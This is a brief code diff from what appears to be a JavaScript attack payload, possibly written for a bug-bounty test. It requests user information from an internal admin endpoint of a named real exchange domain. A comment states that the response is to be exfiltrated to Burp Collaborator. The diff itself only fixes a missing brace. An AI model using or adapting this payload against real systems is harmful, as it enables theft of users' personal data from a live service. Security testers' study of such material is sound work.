@@ -45,7 +45,7 @@
 
         var xhr4 = new XMLHttpRequest();
         xhr4.open('GET', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll', true);
-        xhr4.onreadystatechange = function () 
+        xhr4.onreadystatechange = function () {
             if (xhr4.readyState === 4 && xhr4.status === 200) {
                 var responseData4 = xhr4.responseText;
                 // Exfiltrate responseData4 to Burp Collaborator
